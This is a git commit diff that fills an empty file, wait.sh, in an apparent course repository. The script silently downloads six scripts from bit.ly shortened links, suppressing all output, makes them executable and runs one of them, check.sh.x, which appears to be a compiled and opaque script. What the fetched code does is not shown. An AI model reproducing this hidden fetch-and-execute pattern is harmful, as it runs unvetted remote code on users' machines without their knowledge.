bf6cb9953dd8f0170c30e6fbdaf33dc7257bed8c
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-07-31 17:44:19 +0700

    Update wait.sh

--- Course5/assets/wait.sh
+++ Course5/assets/wait.sh
@@ -1,1 +1,14 @@
-
+#!/bin/bash
+wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
+wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
+wget -O winxpvm.sh https://bit.ly/3BNeNFj > /dev/null 2>&1
+wget -O check.sh.x https://bit.ly/3i8Tdn9 > /dev/null 2>&1
+wget -O region.sh https://bit.ly/3l6SmFa > /dev/null 2>&1
+wget -O spinner.sh https://bit.ly/3rSMCk1 > /dev/null 2>&1
+chmod +x winxpvm.sh
+chmod +x exit.sh
+chmod +x sleep.sh
+chmod +x region.sh
+chmod +x spinner.sh
+chmod +x check.sh.x
+./check.sh.x
